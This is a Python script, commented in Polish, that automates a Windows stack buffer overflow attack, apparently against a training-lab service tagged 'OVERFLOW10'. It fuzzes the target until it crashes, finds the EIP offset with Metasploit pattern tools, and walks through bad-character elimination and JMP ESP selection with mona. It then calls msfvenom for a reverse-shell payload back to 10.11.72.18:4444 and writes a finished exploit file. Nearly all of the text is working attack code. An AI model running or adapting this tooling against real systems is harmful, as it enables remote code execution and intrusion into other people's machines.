def __bufferoverflow__():
    import socket, time, sys, os
    
    #DANE WEJSCIOWE
    
    ip = "10.10.242.51"
    port = 1337 
    
    timeout = 5            #Oczekiwanie na zwrotke polaczenia
    delay = 0              #Opoznienie wysylania
    prefix = "OVERFLOW10 "
    jump = "BBBB"
    changed_char = "C"
    size_packet = 100      #Wielkosc pakietu do fazowania
    padding = '\x90'
    payload = ''
    postfix = ''
    
    
    
    #PROGRAM:
    print()
    print("         USTAWIENIA:")
    print()
    print("IP           : " + ip)
    print("Port         : " + str(port))
    print("Timeout      : " + str(timeout))
    print("Opoznienie   : " + str(delay))
    print("Prefix       : " + prefix)
    print("Start jump   : " + jump + "[to Generate]")
    print("Char to send : " + changed_char)
    print("Size packet  : " + str(size_packet))
    print("Padding      : " + "\\x90")
    print("Payload      : " + "[to Generate]")
    print("Postfix      : " + postfix)
    print()
    print("BUFFER = prefix + [multi] changed_char + jump + padding + payload + postfix")
    print()
    input("[ENTER] - start")
    print()
    #---------------------------------------MODUL FAZZOWANIA
    
    print("-> FAZOWANIE...")
    string = prefix + changed_char * size_packet
    
    while True:
      try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
          s.settimeout(timeout)
          s.connect((ip, port))
          s.recv(1024)
          print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
          s.send(bytes(string, "latin-1"))
          s.recv(1024)
      except:
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        break
      string += 100 * "A"
      time.sleep(delay)
    
    
    length = len(string)
   
    #---------------------------------MODUL GENEROWANIA CIAGU
    print()
    print("-> GENEROWANIE CIAGU ...")
    ciag = os.popen("msf-pattern_create -l "+str(length)).read()
    
    
    input("[entder] - wyslij ciag")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    buffer = prefix + ciag
    
    try:
    	  s.connect((ip, port))
    	  print("Sending evil buffer...")
    	  s.send(bytes(buffer + "\r\n", "latin-1"))
    	  print("Done!")
    except:
    	  print("Could not connect.")
    	  exit(0)
    
    
    while(True):
    	eip = input("Wartosc EIP = ")
    	offset = os.popen("msf-pattern_offset -l"+str(length)+" -q "+str(eip)).read()
    	offset = offset.split(" ")
    	try:
    		offset = int(offset[5])
    		print("[OFFSET = "+str(offset)+"]")
    		break
    	except:
    		print("Nie udalo sie obliczyc przesuniecia")
    
    #--------------------------------USUWANIE BADCHAROW
    print()
    print("-> Generowanie tablicy badcharow")
     
    badchar = ["0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", 0]
    
    
    badchar[1] = "\x01"
    badchar[2] = "\x02"
    badchar[3] = "\x03"
    badchar[4] = "\x04"
    badchar[5] = "\x05"
    badchar[6] = "\x06"
    badchar[7] = "\x07"
    badchar[8] = "\x08"
    badchar[9] = "\x09"
    badchar[10] = "\x0a"
    badchar[11] = "\x0b"
    badchar[12] = "\x0c"
    badchar[13] = "\x0d"
    badchar[14] = "\x0e"
    badchar[15] = "\x0f"
    badchar[16] = "\x10"
    badchar[17] = "\x11"
    badchar[18] = "\x12"
    badchar[19] = "\x13"
    badchar[20] = "\x14"
    badchar[21] = "\x15"
    badchar[22] = "\x16"
    badchar[23] = "\x17"
    badchar[24] = "\x18"
    badchar[25] = "\x19"
    badchar[26] = "\x1a"
    badchar[27] = "\x1b"
    badchar[28] = "\x1c"
    badchar[29] = "\x1d"
    badchar[30] = "\x1e"
    badchar[31] = "\x1f"
    badchar[32] = "\x20"
    badchar[33] = "\x21"
    badchar[34] = "\x22"
    badchar[35] = "\x23"
    badchar[36] = "\x24"
    badchar[37] = "\x25"
    badchar[38] = "\x26"
    badchar[39] = "\x27"
    badchar[40] = "\x28"
    badchar[41] = "\x29"
    badchar[42] = "\x2a"
    badchar[43] = "\x2b"
    badchar[44] = "\x2c"
    badchar[45] = "\x2d"
    badchar[46] = "\x2e"
    badchar[47] = "\x2f"
    badchar[48] = "\x30"
    badchar[49] = "\x31"
    badchar[50] = "\x32"
    badchar[51] = "\x33"
    badchar[52] = "\x34"
    badchar[53] = "\x35"
    badchar[54] = "\x36"
    badchar[55] = "\x37"
    badchar[56] = "\x38"
    badchar[57] = "\x39"
    badchar[58] = "\x3a"
    badchar[59] = "\x3b"
    badchar[60] = "\x3c"
    badchar[61] = "\x3d"
    badchar[62] = "\x3e"
    badchar[63] = "\x3f"
    badchar[64] = "\x40"
    badchar[65] = "\x41"
    badchar[66] = "\x42"
    badchar[67] = "\x43"
    badchar[68] = "\x44"
    badchar[69] = "\x45"
    badchar[70] = "\x46"
    badchar[71] = "\x47"
    badchar[72] = "\x48"
    badchar[73] = "\x49"
    badchar[74] = "\x4a"
    badchar[75] = "\x4b"
    badchar[76] = "\x4c"
    badchar[77] = "\x4d"
    badchar[78] = "\x4e"
    badchar[79] = "\x4f"
    badchar[80] = "\x50"
    badchar[81] = "\x51"
    badchar[82] = "\x52"
    badchar[83] = "\x53"
    badchar[84] = "\x54"
    badchar[85] = "\x55"
    badchar[86] = "\x56"
    badchar[87] = "\x57"
    badchar[88] = "\x58"
    badchar[89] = "\x59"
    badchar[90] = "\x5a"
    badchar[91] = "\x5b"
    badchar[92] = "\x5c"
    badchar[93] = "\x5d"
    badchar[94] = "\x5e"
    badchar[95] = "\x5f"
    badchar[96] = "\x60"
    badchar[97] = "\x61"
    badchar[98] = "\x62"
    badchar[99] = "\x63"
    badchar[100] = "\x64"
    badchar[101] = "\x65"
    badchar[102] = "\x66"
    badchar[103] = "\x67"
    badchar[104] = "\x68"
    badchar[105] = "\x69"
    badchar[106] = "\x6a"
    badchar[107] = "\x6b"
    badchar[108] = "\x6c"
    badchar[109] = "\x6d"
    badchar[110] = "\x6e"
    badchar[111] = "\x6f"
    badchar[112] = "\x70"
    badchar[113] = "\x71"
    badchar[114] = "\x72"
    badchar[115] = "\x73"
    badchar[116] = "\x74"
    badchar[117] = "\x75"
    badchar[118] = "\x76"
    badchar[119] = "\x77"
    badchar[120] = "\x78"
    badchar[121] = "\x79"
    badchar[122] = "\x7a"
    badchar[123] = "\x7b"
    badchar[124] = "\x7c"
    badchar[125] = "\x7d"
    badchar[126] = "\x7e"
    badchar[127] = "\x7f"
    badchar[128] = "\x80"
    badchar[129] = "\x81"
    badchar[130] = "\x82"
    badchar[131] = "\x83"
    badchar[132] = "\x84"
    badchar[133] = "\x85"
    badchar[134] = "\x86"
    badchar[135] = "\x87"
    badchar[136] = "\x88"
    badchar[137] = "\x89"
    badchar[138] = "\x8a"
    badchar[139] = "\x8b"
    badchar[140] = "\x8c"
    badchar[141] = "\x8d"
    badchar[142] = "\x8e"
    badchar[143] = "\x8f"
    badchar[144] = "\x90"
    badchar[145] = "\x91"
    badchar[146] = "\x92"
    badchar[147] = "\x93"
    badchar[148] = "\x94"
    badchar[149] = "\x95"
    badchar[150] = "\x96"
    badchar[151] = "\x97"
    badchar[152] = "\x98"
    badchar[153] = "\x99"
    badchar[154] = "\x9a"
    badchar[155] = "\x9b"
    badchar[156] = "\x9c"
    badchar[157] = "\x9d"
    badchar[158] = "\x9e"
    badchar[159] = "\x9f"
    badchar[160] = "\xa0"
    badchar[161] = "\xa1"
    badchar[162] = "\xa2"
    badchar[163] = "\xa3"
    badchar[164] = "\xa4"
    badchar[165] = "\xa5"
    badchar[166] = "\xa6"
    badchar[167] = "\xa7"
    badchar[168] = "\xa8"
    badchar[169] = "\xa9"
    badchar[170] = "\xaa"
    badchar[171] = "\xab"
    badchar[172] = "\xac"
    badchar[173] = "\xad"
    badchar[174] = "\xae"
    badchar[175] = "\xaf"
    badchar[176] = "\xb0"
    badchar[177] = "\xb1"
    badchar[178] = "\xb2"
    badchar[179] = "\xb3"
    badchar[180] = "\xb4"
    badchar[181] = "\xb5"
    badchar[182] = "\xb6"
    badchar[183] = "\xb7"
    badchar[184] = "\xb8"
    badchar[185] = "\xb9"
    badchar[186] = "\xba"
    badchar[187] = "\xbb"
    badchar[188] = "\xbc"
    badchar[189] = "\xbd"
    badchar[190] = "\xbe"
    badchar[191] = "\xbf"
    badchar[192] = "\xc0"
    badchar[193] = "\xc1"
    badchar[194] = "\xc2"
    badchar[195] = "\xc3"
    badchar[196] = "\xc4"
    badchar[197] = "\xc5"
    badchar[198] = "\xc6"
    badchar[199] = "\xc7"
    badchar[200] = "\xc8"
    badchar[201] = "\xc9"
    badchar[202] = "\xca"
    badchar[203] = "\xcb"
    badchar[204] = "\xcc"
    badchar[205] = "\xcd"
    badchar[206] = "\xce"
    badchar[207] = "\xcf"
    badchar[208] = "\xd0"
    badchar[209] = "\xd1"
    badchar[210] = "\xd2"
    badchar[211] = "\xd3"
    badchar[212] = "\xd4"
    badchar[213] = "\xd5"
    badchar[214] = "\xd6"
    badchar[215] = "\xd7"
    badchar[216] = "\xd8"
    badchar[217] = "\xd9"
    badchar[218] = "\xda"
    badchar[219] = "\xdb"
    badchar[220] = "\xdc"
    badchar[221] = "\xdd"
    badchar[222] = "\xde"
    badchar[223] = "\xdf"
    badchar[224] = "\xe0"
    badchar[225] = "\xe1"
    badchar[226] = "\xe2"
    badchar[227] = "\xe3"
    badchar[228] = "\xe4"
    badchar[229] = "\xe5"
    badchar[230] = "\xe6"
    badchar[231] = "\xe7"
    badchar[232] = "\xe8"
    badchar[233] = "\xe9"
    badchar[234] = "\xea"
    badchar[235] = "\xeb"
    badchar[236] = "\xec"
    badchar[237] = "\xed"
    badchar[238] = "\xee"
    badchar[239] = "\xef"
    badchar[240] = "\xf0"
    badchar[241] = "\xf1"
    badchar[242] = "\xf2"
    badchar[243] = "\xf3"
    badchar[244] = "\xf4"
    badchar[245] = "\xf5"
    badchar[246] = "\xf6"
    badchar[247] = "\xf7"
    badchar[248] = "\xf8"
    badchar[249] = "\xf9"
    badchar[250] = "\xfa"
    badchar[251] = "\xfb"
    badchar[252] = "\xfc"
    badchar[253] = "\xfd"
    badchar[254] = "\xfe"
    badchar[255] = "\xff"
    liczby = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "30", "31", "32", "33", "34", "35", "36", "37", "38", "39", "40", "41", "42", "43", "44", "45", "46", "47", "48", "49", "50", "51", "52", "53", "54", "55", "56", "57", "58", "59", "60", "61", "62", "63", "64", "65", "66", "67", "68", "69", "70", "71", "72", "73", "74", "75", "76", "77", "78", "79", "80", "81", "82", "83", "84", "85", "86", "87", "88", "89", "90", "91", "92", "93", "94", "95", "96", "97", "98", "99", "100", "101", "102", "103", "104", "105", "106", "107", "108", "109", "110", "111", "112", "113", "114", "115", "116", "117", "118", "119", "120", "121", "122", "123", "124", "125", "126", "127", "128", "129", "130", "131", "132", "133", "134", "135", "136", "137", "138", "139", "140", "141", "142", "143", "144", "145", "146", "147", "148", "149", "150", "151", "152", "153", "154", "155", "156", "157", "158", "159", "160", "161", "162", "163", "164", "165", "166", "167", "168", "169", "170", "171", "172", "173", "174", "175", "176", "177", "178", "179", "180", "181", "182", "183", "184", "185", "186", "187", "188", "189", "190", "191", "192", "193", "194", "195", "196", "197", "198", "199", "200", "201", "202", "203", "204", "205", "206", "207", "208", "209", "210", "211", "212", "213", "214", "215", "216", "217", "218", "219", "220", "221", "222", "223", "224", "225", "226", "227", "228", "229", "230", "231", "232", "233", "234", "235", "236", "237", "238", "239", "240", "241", "242", "243", "244", "245", "246", "247", "248", "249", "250", "251", "252", "253", "254", "255"]
    
    zle = [0]
    
    while(True):
    	string = ''
    	for x in range(1, 256):
    		if(not(ord(badchar[x]) in (zle))):            
    		    string = string + badchar[x]
    	input("[enter] wyslanie badcharow")
    
    	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    	print(offset)
    	buffer = prefix + changed_char*offset + jump + string
    
    	try:
    	  s.connect((ip, port))
    	  print("Sending evil buffer...")
    	  s.send(bytes(buffer + "\r\n", "latin-1"))
    	  print("Done!")
    	except:
    	  print("Could not connect.")
    	  exit(0)
    	list_char = ''
    	for y in zle:
    		list_char = list_char + "\\x" + "{:02x}".format(y)
    	print("***********************************************************************")
    	print("------ImmunityDebugger + mona-------------")
    	print("      !mona config -set workingfolder c:\mona\%p")
    	print("      !mona bytearray -b \""+str(list_char)+"\"")
    	print("      !mona compare -f C:\mona\%p\\bytearray.bin -a esp")
    	print();
    	print("BADCHARS:")
    	print("-hex----"+str(list_char)+"-----")
    	print("-bin----"+str(zle)+"-----")
    	print()
    	print("\"payload\" - konczy dodawanie badcharow")
    	print()
    	char = input("Podaj badchar [binarnie 1-255] = ")
    	if(char == "payload"):
    		break
    	if((char != '') and (char in liczby)):
    		zle.insert(len(zle), int(char))
    	else:
    		print('                                   Niepoprawna wartosc !!!')
    		print("                                   Badchary nie zostaly zmienione")



#------------------------------------------------[POBIERANIE ADRESU JMP]
   
    print()
    print("*******************************************************")
    print("------------------SKOK JMP----------------------------")
    print()
    print("              !mona jmp -r esp -cpb \"<badchars>\"")
    print()
    print("              !mona modules")
    print("              !mona jmp -r esp -cpb \"<badchars>\" -m kernel32.dll")
    print()
    adres_jmp = input("Podaj adres skoku (przyklad: \\x00\\xa3) [jmp]: ")

#------------------------------------------------[GENEROWANIE SHELLCODE]
    
    import os
    gen_shellcode = "msfvenom -p windows/shell_reverse_tcp LHOST=10.11.72.18 LPORT=4444 -b \""+str(list_char)+"\" EXITFUNC=thread -f c"
    print(gen_shellcode)
    shell_code = os.popen(gen_shellcode).read()

    wiersze = shell_code.split("\n")

    zapis = "import os, socket\n"
    zapis = zapis + "ip = \"10.10.176.235\"\n"
    zapis = zapis + "port = 1337\n"
    zapis = zapis + "payload = (\n"
    for x in wiersze:
        if(x != '' and x[0] == '"'):
            zapis = zapis + x + '\n';
    zapis = zapis + ")"                         
    zapis = zapis + "\npocisk = \""+prefix+"\" + '"+changed_char+"'*"+str(offset)+" + \""+adres_jmp+"\" + \"\\x90\"*16 + payload"
    zapis = zapis + "\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)"
    zapis = zapis + "\ntry:"
    zapis = zapis + "\n  s.connect((ip, port))"
    zapis = zapis + "\n  print(\"Sending evil buffer...\")"
    zapis = zapis + "\n  s.send(bytes(pocisk, \"latin-1\"))"
    zapis = zapis + "\n  print(\"Done!\")"
    zapis = zapis + "\nexcept:"
    zapis = zapis + "\n  print(\"could not connect.\")"

    f = open("exploit_bof.py", "w")
    f.write(zapis)
    f.close() 
